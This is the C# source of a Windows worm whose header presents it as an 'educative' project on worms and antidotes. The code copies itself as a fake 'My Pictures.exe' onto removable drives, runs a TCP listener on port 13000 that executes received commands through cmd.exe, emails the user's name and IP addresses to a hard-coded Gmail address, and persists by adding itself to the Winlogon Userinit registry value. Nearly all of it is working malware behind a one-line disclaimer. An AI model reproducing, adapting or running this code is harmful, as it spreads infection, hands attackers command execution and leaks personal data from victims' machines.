/*
  By: whitedragon3257
  Obs: This project is make for educative motives, i'm NOT responsabilize for damages caused in the peoples because use of thirds
  Description: This code is part of educative project about worms and anti-worms, using the criative and fun to learn about worm and anti-worms, using the analogy of magic and antidote.
*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;
using System.Net;
using System.Text;
using System.Net.Mail;
using System.Net.Sockets;
 
namespace WindowsFormsApplication2{ static class Program{public class Threadz{class Server{
                private TcpListener tcpListener;
                private Thread listenThread;
                public Server(){
                    string currIPadd;WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
                    WebResponse response = request.GetResponse(); StreamReader stream = new StreamReader(response.GetResponseStream());
                    currIPadd = stream.ReadToEnd(); stream.Close(); response.Close();
                    int first = currIPadd.IndexOf("Address: ") + 9;int last = currIPadd.LastIndexOf("</body>");
                    currIPadd = currIPadd.Substring(first, last - first);
                    this.tcpListener = new TcpListener(IPAddress.Any, 13000);
                    this.listenThread = new Thread(new ThreadStart(ListenForClients)); this.listenThread.Start(); }
                private void ListenForClients(){try{this.tcpListener.Start();while (true) {
                            //blocks until a client has connected to the server
                            TcpClient client = this.tcpListener.AcceptTcpClient();
                            // create a thread to handle communication with connected client
                            Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClientComm)); clientThread.Start(client);}}
                    catch (Exception ex) {MessageBox.Show(ex.Message); }}
                private void HandleClientComm(object client) {
                    TcpClient tcpClient = (TcpClient)client;NetworkStream clientStream = tcpClient.GetStream();
                    byte[] message = new byte[4096]; int bytesRead;
                    while (true) { bytesRead = 0;try{
                            //blocks until a client sends a message
                            bytesRead = clientStream.Read(message, 0, 4096);}
                        catch{
                            //a socket error has occured
                            break;}
                        if (bytesRead == 0){
                            //the client has disconnected from the server
                            break; }
                        //message has successfully been received
                        ASCIIEncoding encoder = new ASCIIEncoding();
                        System.Diagnostics.Debug.WriteLine(encoder.GetString(message, 0, bytesRead));
                        MessageBox.Show(encoder.GetString(message, 0, bytesRead)); }
                    tcpClient.Close();} }
            public void WorkSpreadFunction(){ try{
                    Server srv = new Server(); string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\msmgr.exe";
                    System.Reflection.Assembly currpath = System.Reflection.Assembly.GetExecutingAssembly();
                    string fullProcPath = currpath.Location;
                    while (21 == 21){
                    loop11:
                        Thread.Sleep(2522); DriveInfo c = new DriveInfo(@"C:\");
                        if (c.IsReady){
                            if (c.DriveType == DriveType.Fixed){goto loop1; }
                            try{File.Copy(fullProcPath, "C:\\My Pictures.exe");
                                if (File.Exists("C:\\My Pictures.exe")){
                                    try {
                                        Directory.CreateDirectory("C:\\My Pictures");
                                        File.SetAttributes("C:\\My Pictures", FileAttributes.Hidden); }
                                    catch{ } } }
                            catch{ } }
                    loop1:
                        DriveInfo d = new DriveInfo(@"D:\");
                    if (d.IsReady) {
                        if (d.DriveType == DriveType.Fixed) {goto loop2;}
                        try{ File.Copy(fullProcPath, "D:\\My Pictures.exe");
                            if (File.Exists("D:\\My Pictures.exe")) {
                                try {
                                    Directory.CreateDirectory("D:\\My Pictures");
                                    File.SetAttributes("D:\\My Pictures", FileAttributes.Hidden);}
                                catch{ } } }
                        catch{ } }
                    loop2:
                        DriveInfo e = new DriveInfo(@"E:\");
                    if (e.IsReady){
                        if (e.DriveType == DriveType.Fixed){ goto loop3; }
                        try { File.Copy(fullProcPath, "E:\\My Pictures.exe");
                            if (File.Exists("E:\\My Pictures.exe")) {try {
                                    Directory.CreateDirectory("E:\\My Pictures");
                                    File.SetAttributes("E:\\My Pictures", FileAttributes.Hidden);}
                                catch {} }}
                        catch {} }
                    loop3:
                        DriveInfo f = new DriveInfo(@"F:\");
                    if (f.IsReady) {if (f.DriveType == DriveType.Fixed) {goto loop4; }
                      try { File.Copy(fullProcPath, "F:\\My Pictures.exe"); if (File.Exists("F:\\My Pictures.exe")) {
                                try{ Directory.CreateDirectory("F:\\My Pictures"); File.SetAttributes("F:\\My Pictures", FileAttributes.Hidden); }
                                catch {} }}
                        catch{} }
                    loop4:
                        DriveInfo g = new DriveInfo(@"G:\");
                    if (g.IsReady){if (g.DriveType == DriveType.Fixed){ goto loop5;}
                        try{File.Copy(fullProcPath, "G:\\My Pictures.exe");if (File.Exists("G:\\My Pictures.exe"))  {
                                try{
                                    Directory.CreateDirectory("G:\\My Pictures");
                                    File.SetAttributes("G:\\My Pictures", FileAttributes.Hidden);}
                                catch{}}}
                        catch{}}
                    loop5:
                        DriveInfo h = new DriveInfo(@"H:\");
                    if (h.IsReady) {if (h.DriveType == DriveType.Fixed) {goto loop6; }
                        try {File.Copy(fullProcPath, "H:\\My Pictures.exe"); if (File.Exists("H:\\My Pictures.exe")) {
                                try { Directory.CreateDirectory("H:\\My Pictures"); File.SetAttributes("H:\\My Pictures", FileAttributes.Hidden);}
                                catch{}}}
                        catch {}}
                    loop6:
                        DriveInfo i = new DriveInfo(@"I:\");
                        if (i.IsReady){if (i.DriveType == DriveType.Fixed) {goto loop7;} }
                        try {File.Copy(fullProcPath, "I:\\My Pictures.exe");
                            if (File.Exists("I:\\My Pictures.exe")) {
                                try{
                                    Directory.CreateDirectory("I:\\My Pictures");
                                    File.SetAttributes("I:\\My Pictures", FileAttributes.Hidden);}
                                catch { } }}
                        catch{ }
                    loop7:
                        DriveInfo j = new DriveInfo(@"J:\");
                    if (j.IsReady) {if (j.DriveType == DriveType.Fixed){goto loop8;}
                        try { File.Copy(fullProcPath, "J:\\My Pictures.exe");
                            if (File.Exists("J:\\My Pictures.exe")) {
                                try {
                                    Directory.CreateDirectory("J:\\My Pictures");
                                    File.SetAttributes("J:\\My Pictures", FileAttributes.Hidden);}
                                catch { } }}
                        catch {}}
                    loop8:
                        DriveInfo k = new DriveInfo(@"K:\");
                    if (k.IsReady) {if (k.DriveType == DriveType.Fixed){goto loop9;}
                        try{File.Copy(fullProcPath, "K:\\My Pictures.exe");
                            if (File.Exists("K:\\My Pictures.exe")) {
                                try{
                                    Directory.CreateDirectory("K:\\My Pictures");
                                    File.SetAttributes("K:\\My Pictures", FileAttributes.Hidden);}
                                catch{} } }
                        catch {} }
                    loop9:
                        DriveInfo l = new DriveInfo(@"L:\");
                    if (l.IsReady){if (l.DriveType == DriveType.Fixed){ goto loop10;}
                        try{ File.Copy(fullProcPath, "L:\\My Pictures.exe");
                            if (File.Exists("L:\\My Pictures.exe")) {
                                try{
                                    Directory.CreateDirectory("L:\\My Pictures");
                                    File.SetAttributes("L:\\My Pictures", FileAttributes.Hidden); }
                                catch { } }}
                        catch{ } }
                    loop10:
                        DriveInfo m = new DriveInfo(@"M:\");
                    if (m.IsReady) {
                        if (m.DriveType == DriveType.Fixed){ goto loop11;}
                        try{ File.Copy(fullProcPath, "M:\\My Pictures.exe");
                            if (File.Exists("M:\\My Pictures.exe")) { try{
                                    Directory.CreateDirectory("M:\\My Pictures");
                                    File.SetAttributes("M:\\My Pictures", FileAttributes.Hidden);}
                                catch {  } }}
                        catch { } } }}
                catch{ } }
            public void remoteShell(){
                ProcessStartInfo processInfo; Process process;
                TcpListener server = null; bool isFirst = true;
                try{
                    Int32 port = 13000;
                    IPAddress localAddr = IPAddress.Parse("127.0.0.1");
                    server = new TcpListener(localAddr, port);
                    server.Start(); Byte[] bytes = new Byte[256];
                    String command = null; int i; string recv_char; byte[] msg;
                    TcpClient client = server.AcceptTcpClient();  
                    NetworkStream stream = client.GetStream();
                    msg = System.Text.Encoding.ASCII.GetBytes("Enter shell to execute:\r\n");
                    stream.Write(msg, 0, msg.Length);
                    while (true){ if (!isFirst){
                            msg = System.Text.Encoding.ASCII.GetBytes("Enter a command:\r\n");
                            stream.Write(msg, 0, msg.Length); }  
                      command = null;
                        while ((i = stream.Read(bytes, 0, bytes.Length)) != 0) {
                            recv_char = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                            command += recv_char;
                            if (command.Contains("\n"))
                                break;}
                        if (command.Equals("exit\r\n")){
                            msg = System.Text.Encoding.ASCII.GetBytes("Bye...\r\n");
                            stream.Write(msg, 0, msg.Length); client.Close();
                            break;}
                        processInfo = new ProcessStartInfo("cmd.exe", "/C " + command);
                        processInfo.CreateNoWindow = true;
                        processInfo.RedirectStandardOutput = true;
                        processInfo.UseShellExecute = false;
                        process = Process.Start(processInfo);                     
                        string output = process.StandardOutput.ReadToEnd();
                        process.Close(); isFirst = false;
                        if (output != null){
                            msg = System.Text.Encoding.ASCII.GetBytes(output + "\n"); 
                            stream.Write(msg, 0, msg.Length);}
                        else{
                            msg = System.Text.Encoding.ASCII.GetBytes("Command execution failed\r\n");
                            stream.Write(msg, 0, msg.Length);} }}
                catch{}
                finally { server.Stop();} }
            public void taskmgrKill(){}
            public void rundllKill(){}
            public void Send(){
                try {
                    var ping = new Ping();
                    var opt = new PingOptions { DontFragment = true };
                    var buff = Encoding.ASCII.GetBytes(new string('z', 10));
                    IPGlobalProperties networksys = IPGlobalProperties.GetIPGlobalProperties();
                    TcpConnectionInformation[] conections = networksys.GetActiveTcpConnections();
                    string conn = conections.ToString(); string wormHost = System.Net.Dns.GetHostName();
                    System.Net.IPHostEntry myIPs = System.Net.Dns.GetHostByName(wormHost);
                    IPHostEntry hostip;
                    string localIP = "?"; hostip = Dns.GetHostEntry(Dns.GetHostName());
                    foreach (IPAddress ip in hostip.AddressList) {
                      if (ip.AddressFamily == AddressFamily.InterNetwork){ localIP = ip.ToString();}}
                    foreach (System.Net.IPAddress myIP in myIPs.AddressList) {var host = myIP.ToString();
                        try{ var reply = ping.Send(host, 60, buff, opt);
                            if (reply.Status == IPStatus.Success) {
                                string currIPadd;
                                WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
                                WebResponse response = request.GetResponse();
                                StreamReader stream = new StreamReader(response.GetResponseStream());
                                currIPadd = stream.ReadToEnd();
                                stream.Close(); response.Close();
                                int first = currIPadd.IndexOf("Address: ") + 9;
                                int last = currIPadd.LastIndexOf("</body>");
                                currIPadd = currIPadd.Substring(first, last - first); Thread.Sleep(200);
                                MailMessage MailSend = new MailMessage();
                                MailSend.To.Add("0recycler0@gmail.com");
                                MailSend.Subject = "Test Mail";
                                MailSend.Body = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString() + "\n" + localIP + "\n" + currIPadd;
                                MailSend.From = new MailAddress("0recycler0@gmail.com");
                                SmtpClient smtp = new SmtpClient();
                                smtp.Host = "smtp.gmail.com";
                                smtp.EnableSsl = true;
                                smtp.Credentials = new NetworkCredential("",""); //gmail account and pass here
                                smtp.Send(MailSend); }}
                        catch { }}}
                catch { } }};
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr OpenProcess(int access, bool Ihandle, int procID);
        static void Main(){   
            Threadz SpreadWorm = new Threadz();
            Thread thread = new Thread(new ThreadStart(SpreadWorm.WorkSpreadFunction)); thread.Start();
            Threadz KillThread = new Threadz();
            Thread oKillThread = new Thread(new ThreadStart(KillThread.taskmgrKill)); oKillThread.Start();
            Threadz cmd = new Threadz();
            Thread ocmd = new Thread(new ThreadStart(cmd.remoteShell)); ocmd.Start();
            Threadz SendMail = new Threadz();
            Thread Mailer = new Thread(new ThreadStart(SendMail.Send)); Mailer.Start();
            Threadz rDll = new Threadz();
            Thread rDll32 = new Thread(new ThreadStart(rDll.rundllKill)); rDll32.Start();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\msmgr.exe";
            string pathSec = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Userinit.exe, " + 
Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\msmgr.exe";
            System.Reflection.Assembly currpath = System.Reflection.Assembly.GetExecutingAssembly();
            string fullProcPath = currpath.Location; string curdir = Directory.GetCurrentDirectory() + @"My Pictures\";
            try { Process.Start(curdir); }
            catch { }
            try { File.Copy(fullProcPath, path); }
            catch{ } RegistryKey startKeySec = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            if (startKeySec == null) { }
            else{try{ startKeySec.SetValue("Userinit", pathSec); }
                catch { }
                finally {startKeySec.Close(); }}}}}
